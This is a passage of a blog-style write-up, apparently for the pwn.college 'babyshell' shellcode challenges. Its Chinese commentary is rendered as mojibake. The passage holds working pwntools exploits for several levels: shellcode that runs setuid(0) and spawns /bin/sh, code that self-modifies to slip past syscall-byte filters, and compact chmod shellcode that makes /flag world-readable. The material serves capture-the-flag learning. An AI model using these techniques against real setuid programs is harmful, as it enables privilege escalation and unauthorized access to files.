class="hljs-comment"># gdb.attach(p) </span><br><br><span class="hljs-comment"># æ‰§è¡Œ /bin/sh ä»¥è·å–ç‰¹æƒshell</span><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    xor    rdi, rdi              # è®¾ç½® rdi å¯„å­˜å™¨ä¸º 0ï¼Œè¡¨ç¤ºè®¾ç½®å½“å‰è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ· ID</span><br><span class="hljs-string">    mov    eax, 0x69             # å°†ç³»ç»Ÿè°ƒç”¨å· 105 (setuid) æ”¾å…¥ eax å¯„å­˜å™¨</span><br><span class="hljs-string">    push 0x050e</span><br><span class="hljs-string">    inc qword ptr [rsp]</span><br><span class="hljs-string">    call rsp</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    mov    rax, 59               # è®¾ç½® rax å¯„å­˜å™¨ä¸º 59ï¼Œè¡¨ç¤ºç³»ç»Ÿè°ƒç”¨ execve</span><br><span class="hljs-string">    lea    rdi, [rip+binsh]      # å°† /bin/sh å­—ç¬¦ä¸²åœ°å€æ”¾å…¥ rdi å¯„å­˜å™¨</span><br><span class="hljs-string">    xor    rsi, rsi              # å°† rsi å¯„å­˜å™¨ç½®é›¶</span><br><span class="hljs-string">    xor    rdx, rdx              # å°† rdx å¯„å­˜å™¨ç½®é›¶</span><br><span class="hljs-string">    push 0x050e</span><br><span class="hljs-string">    inc qword ptr [rsp]</span><br><span class="hljs-string">    call rsp</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>shellcode = asm(shellcode)<br><br>p.send(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>è°ƒè¯•ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">context<span class="hljs-selector-class">.arch</span> = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context<span class="hljs-selector-class">.log_level</span> = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]</span><br><br>gdb<span class="hljs-selector-class">.attach</span>(sh) <br><br>gdb&gt; <span class="hljs-attribute">display</span>/xg <span class="hljs-variable">$rbp</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level5&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    jmp two</span><br><span class="hljs-string">one:</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">    push 0x0</span><br><span class="hljs-string">    push 0x702d</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    push 0x0</span><br><span class="hljs-string">    push rdx</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    push 0x0</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    push 0x050e</span><br><span class="hljs-string">    inc qword ptr [rsp]</span><br><span class="hljs-string">    jmp rsp</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">two:</span><br><span class="hljs-string">    call one</span><br><span class="hljs-string">    .string &quot;/bin/bash&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>shellcode = asm(shellcode)<br><br>p.send(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><blockquote><p>Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!</p></blockquote><p>åŒä¸Š</p><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.</p><p>æŠŠ flag å±æ€§æ›´æ”¹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level7&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x67616c662f  # â€œ/flagâ€</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rsi, 0777</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 90</span><br><span class="hljs-string"></span><br><span class="hljs-string">    syscall </span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 60 # exit(0)</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>shellcode = asm(shellcode)<br><br>p.send(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><ul><li><code>0x</code> å‰ç¼€è¡¨ç¤ºåå…­è¿›åˆ¶ã€‚ä¾‹å¦‚ï¼Œ<code>mov rax, 0x67616c662f</code> å°†å°†åå…­è¿›åˆ¶æ•° <code>0x67616c662f</code> èµ‹å€¼ç»™ <code>rax</code> å¯„å­˜å™¨ã€‚</li><li><code>0</code> å‰ç¼€è¡¨ç¤ºå…«è¿›åˆ¶ã€‚ä¾‹å¦‚ï¼Œ<code>mov rsi, 0777</code> å°†å…«è¿›åˆ¶æ•° <code>0777</code>ï¼ˆå¯¹åº”åè¿›åˆ¶æ•° <code>511</code>ï¼‰èµ‹å€¼ç»™ <code>rsi</code> å¯„å­˜å™¨ã€‚</li><li>æ²¡æœ‰å‰ç¼€çš„æ•°å€¼é»˜è®¤ä¸ºåè¿›åˆ¶ã€‚ä¾‹å¦‚ï¼Œ<code>mov rax, 90</code> å°†åè¿›åˆ¶æ•° <code>90</code> èµ‹å€¼ç»™ <code>rax</code> å¯„å­˜å™¨ã€‚</li></ul><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><blockquote><p>Write and execute shellcode to read the flag, but you only get 18 bytes.</p></blockquote><p><code>chmod</code>Â å‘½ä»¤ä¼šä¿®æ”¹è½¯é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶çš„æƒé™,è€Œä¸ä¼šæ”¹å˜è½¯é“¾æ¥æœ¬èº«çš„æƒé™</p><p>ç”±äº/flag è¿™å‡ ä¸ªå­—ç¬¦ä¼šå ç”¨å¾ˆå¤šçš„å­—èŠ‚æ•°ï¼Œå› æ­¤å¯ä»¥åˆ›å»ºä¸€ä¸ª A æ–‡ä»¶å‡å°‘é•¿åº¦</p><p>mov å¯¹åº”çš„å­—èŠ‚ä¼šå¾ˆé•¿ï¼Œpush å’Œ pop ç»„åˆä¼šå‡çŸ­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level8&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    /*  chmod(&#x27;A&#x27;,777) */</span><br><span class="hljs-string">    push 0x41</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    push 0777</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    push SYS_chmod /* 0x5a */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Assemble the shellcode</span><br>shellcode = asm(shellcode)<br><span class="hljs-built_in">print</span>(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br>p.send(shellcode)<br><br><span class="hljs-comment"># Interact with the process</span><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">16</span> bytes<br>      Address      |                      Bytes                    |          Instructions<br>------------------------------------------------------------------------------------------<br><span class="hljs-number">0x000000002dc00000</span> | 6a <span class="hljs-number">41</span>                                         | <span class="hljs-keyword">push</span> <span class="hljs-number">0x41</span><br><span class="hljs-number">0x000000002dc00002</span> | <span class="hljs-number">48</span> <span class="hljs-number">89</span> e7                                      | <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-number">0x000000002dc00005</span> | <span class="hljs-number">68</span> ff <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                                | <span class="hljs-keyword">push</span> <span class="hljs-number">0x1ff</span><br><span class="hljs-number">0x000000002dc0000a</span> | 5e                                            | <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br><span class="hljs-number">0x000000002dc0000b</span> | 6a 5a                                         | <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br><span class="hljs-number">0x000000002dc0000d</span> | <span class="hljs-number">58</span>                                            | <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br><span class="hljs-number">0x000000002dc0000e</span> | 0f <span class="hljs-number">05</span>                                         | <span class="hljs-keyword">syscall</span> <br></code></pre></td></tr></table></figure><ul><li>è½¯é“¾æ¥(symbolic link)æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶,å®ƒåŒ…å«ä¸€ä¸ªæŒ‡å‘å…¶ä»–æ–‡ä»¶æˆ–ç›®å½•çš„å¼•ç”¨ã€‚</li><li>ç¡¬é“¾æ¥(hard link)æ˜¯ä¸€ä¸ªæ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„å¦ä¸€ä¸ªå…¥å£ç‚¹,æŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶æ•°æ®ã€‚<br>è½¯é“¾æ¥çš„é‡è¦åº”ç”¨åœºæ™¯:</li></ul><ol><li><strong>ç¨‹åºå…¥å£ç‚¹</strong>: å°†å¸¸ç”¨ç¨‹åºçš„å¿«æ·æ–¹å¼åˆ›å»ºä¸ºè½¯é“¾æ¥,æ”¾åœ¨Â <code>/usr/bin</code>Â ç­‰å¸¸è§è·¯å¾„ä¸‹,æ–¹ä¾¿ç”¨æˆ·ç›´æ¥è°ƒç”¨ã€‚</li><li><strong>ç›®å½•å¿«æ·æ–¹å¼</strong>: åœ¨Â <code>~/</code>Â ç›®å½•ä¸‹åˆ›å»ºæŒ‡å‘å¸¸ç”¨ç›®å½•çš„è½¯é“¾æ¥,æ–¹ä¾¿å¿«é€Ÿè®¿é—®ã€‚<h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1></li></ol><blockquote><p>Write and execute shellcode to read the flag, but your input has data inserted into it before being executed.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; (<span class="hljs-keyword">unsigned</span> __int64)shellcode_size; ++k )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( k / <span class="hljs-number">10</span> % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )<br>    *((_BYTE *)shellcode + k) = <span class="hljs-number">-52</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ 10 åˆ° 20ä¸ªå­—èŠ‚ä¼šè¢«ä¿®æ”¹ä¸º 0xccï¼Œå¯ä»¥å°†è¿™æ®µå¡«å……ï¼Œç„¶åä½¿ç”¨ jmp è·³è¿‡è¿™æ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level9&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    /*  chmod(&#x27;A&#x27;,777) */</span><br><span class="hljs-string">    push 0x41</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    push 4</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    jmp continue</span><br><span class="hljs-string">    .rept 10</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    .endr</span><br><span class="hljs-string">continue:</span><br><span class="hljs-string">    push SYS_chmod /* 0x5a */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Assemble the shellcode</span><br>shellcode = asm(shellcode)<br><span class="hljs-built_in">print</span>(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br>p.send(shellcode)<br><br><span class="hljs-comment"># Interact with the process</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><p>æ’åºã€‚å…¶ä¸­v10æ˜¯shellcode&gt;&gt;3-1ï¼Œå› æ­¤åªéœ€è¦å°†é•¿åº¦æ§åˆ¶åœ¨ 16 å†…å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; v10; ++k )<br>&#123;<br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt; v10 - k - <span class="hljs-number">1</span>; ++m )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v13[m] &gt; v13[m + <span class="hljs-number">1</span>] )<br>    &#123;<br>      v14 = v13[m];<br>      v13[m] = v13[m + <span class="hljs-number">1</span>];<br>      v13[m + <span class="hljs-number">1</span>] = v14;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="11"><a href="#11" class="headerlink" title="11"></a>11</h1><p>åŒä¸Š</p><h1 id="12"><a href="#12" class="headerlink" title="12"></a>12</h1><blockquote><p>Write and execute shellcode to read the flag, but every byte in your input must be unique.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; (<span class="hljs-keyword">int</span>)k &lt; (<span class="hljs-keyword">unsigned</span> __int64)shellcode_size; ++k )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( *((_BYTE *)v11 + *((<span class="hljs-keyword">unsigned</span> __int8 *)shellcode + (<span class="hljs-keyword">int</span>)k)) )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed filter at byte %d!\n&quot;</span>, k);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  *((_BYTE *)v11 + *((<span class="hljs-keyword">unsigned</span> __int8 *)shellcode + (<span class="hljs-keyword">int</span>)k)) = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€æœ‰çš„å­—èŠ‚éƒ½æ˜¯ä¸åŒçš„</p><p>æ€è·¯ï¼šåˆ©ç”¨ mov å¯¹ä¸åŒå¤§å°å¯„å­˜å™¨æ“ä½œæ—¶å­—èŠ‚ç æ˜¯ä¸åŒçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level12&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x41</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov sil, 0x4</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Assemble the shellcode</span><br>shellcode = asm(shellcode)<br><span class="hljs-built_in">print</span>(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br>p.send(shellcode)<br><br><span class="hljs-comment"># Interact with the process</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="13"><a href="#13" class="headerlink" title="13"></a>13</h1><p>12bytes çš„ç©ºé—´ï¼Œå¯ä»¥ä½¿ç”¨ä¹‹å‰è½¯é“¾æ¥çš„æ–¹æ³•ï¼Œå¹¶è¿›ä¸€æ­¥ä¼˜åŒ–å­—èŠ‚æ•°</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">shellcode</span> = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    /*  chmod(&#x27;A&#x27;,777) */</span><br><span class="hljs-string">    push 0x41</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    push 0777</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    push SYS_chmod /* 0x5a */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level13&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x41</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov sil, 0x4</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Assemble the shellcode</span><br>shellcode = asm(shellcode)<br><span class="hljs-built_in">print</span>(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\nlength of code is \n\n&quot;</span>,<span class="hljs-built_in">len</span>(shellcode))<br><br>p.send(shellcode)<br><br><span class="hljs-comment"># Interact with the process</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="14"><a href="#14" class="headerlink" title="14"></a>14</h1><p>6 bytesï¼Œè‡ªç„¶è¦å€ŸåŠ›</p><p>çœ‹ä¸€ä¸‹è°ƒç”¨ shellcode æ—¶çš„é€»è¾‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">  shellcode = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0x1942C000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( shellcode != (<span class="hljs-keyword">void</span> *)<span class="hljs-number">423804928</span> )<br>    __assert_fail(<span class="hljs-string">&quot;shellcode == (void *)0x1942c000&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-string">&quot;main&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mapped 0x1000 bytes for shellcode at %p!\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<span class="hljs-number">0x1942C000</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Reading 0xc bytes from stdin.\n&quot;</span>);<br>  shellcode_size = read(<span class="hljs-number">0</span>, shellcode, <span class="hljs-number">0xC</span>uLL);<br>  <span class="hljs-keyword">if</span> ( !shellcode_size )<br>    __assert_fail(<span class="hljs-string">&quot;shellcode_size &gt; 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x69</span>u, <span class="hljs-string">&quot;main&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Removing write permissions from first 4096 bytes of shellcode.\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( mprotect(shellcode, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">5</span>) )<br>    __assert_fail(<span class="hljs-string">&quot;mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x6C</span>u, <span class="hljs-string">&quot;main&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge is about to execute the following shellcode:\n&quot;</span>);<br>  print_disassembly(shellcode, shellcode_size);<br>  <span class="hljs-built_in">puts</span>(&amp;byte_2505);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing shellcode!\n&quot;</span>);<br>  ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))shellcode)();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;### Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>.text:<span class="hljs-number">000000000000180</span>E                 lea     rdi, aExecutingShell ; <span class="hljs-string">&quot;Executing shellcode!\n&quot;</span><br>.text:<span class="hljs-number">0000000000001815</span>                 call    _puts<br>.text:<span class="hljs-number">000000000000181</span>A                 mov     rax, cs:shellcode<br>.text:<span class="hljs-number">0000000000001821</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000001824</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000001829</span>                 call    rdx<br>.text:<span class="hljs-number">000000000000182B</span>                 lea     rdi, aGoodbye   ; <span class="hljs-string">&quot;### Goodbye!&quot;</span><br>.text:<span class="hljs-number">0000000000001832</span>                 call    _puts<br>.text:<span class="hljs-number">0000000000001837</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span 